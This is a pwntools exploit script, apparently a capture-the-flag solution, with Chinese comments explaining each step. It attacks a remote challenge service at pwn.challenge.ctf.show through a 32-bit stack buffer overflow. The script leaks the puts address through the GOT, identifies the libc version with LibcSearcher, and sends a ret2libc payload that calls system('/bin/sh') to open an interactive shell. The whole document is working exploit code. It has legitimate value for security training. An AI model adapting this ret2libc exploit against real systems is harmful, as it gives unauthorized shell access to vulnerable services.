from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
p = remote('pwn.challenge.ctf.show',28162)
elf = ELF('pwn1')
offset = 0x88 + 0x4
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
main = elf.symbols['main']
payload = b'a' * offset + p32(puts_plt) + p32(main) + p32(puts_got)
p.sendline(payload)
# 接收puts函数输出的puts函数在内存的地址
puts_addr = u32(p.recv()[0:4])
print(hex(puts_addr))

# 在根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址
libc = LibcSearcher("puts",puts_addr)
# 找到libc中的puts函数地址之后，将内存的puts函数地址减去libc中的puts函数地址就得到了libc的基地址
libc_base = puts_addr - libc.dump("puts")
print(hex(libc_base))
# 使用libc.dump("system")找到libc中的system函数地址，再加上基地址就得到system函数在内存的地址
system_addr = libc_base + libc.dump("system")
# 使用libc.dump("str_bin_sh")找到libc中的"/bin/sh"字符串地址，再加上基地址就得到"/bin/sh"字符串在内存的地址
binsh_addr = libc_base + libc.dump("str_bin_sh")
# payload：填充栈空间到返回地址，将返回地址覆盖为system函数的地址
# 然后填充执行system函数之后的返回地址，填充什么都可以，但是长度必须为4
# 最后填入system的参数“/bin/sh”
payload = offset * b'a' + p32(system_addr) + b'a' * 4 + p32(binsh_addr)
p.sendline(payload)
p.recv()
p.interactive()
